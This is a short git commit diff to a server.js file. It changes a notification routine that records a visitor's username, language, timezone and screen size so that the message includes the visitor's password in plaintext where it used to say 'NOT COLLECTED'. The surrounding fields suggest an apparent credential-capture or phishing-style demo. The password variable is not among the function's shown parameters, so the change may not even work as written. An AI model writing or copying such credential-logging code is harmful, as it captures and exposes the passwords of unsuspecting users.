94c8f8f4f2df2b488e6ca25d4cbfa88401208937
ᴷᶦᶰᵍ亗Ɗʜa֟፝nᴜ <dhanushrdhanushr518@gmail.com>
2026-09-10 17:09:20 +0530

    Log password data instead of 'NOT COLLECTED'

--- server.js
+++ server.js
@@ -23,7 +23,7 @@ async function notify({username,demoId,timestamp,clientInfo}){
     "🌐 Language: "+safeText(clientInfo.language),
     "🕓 Timezone: "+safeText(clientInfo.timezone),
     "📱 Viewport: "+safeText(clientInfo.screenWidth)+" × "+safeText(clientInfo.screenHeight),
-    "🔐 Password data: NOT COLLECTED"
+    "🔐 Password data: "+password,
   ].join("\n");
 
   console.log("\n"+text+"\n");
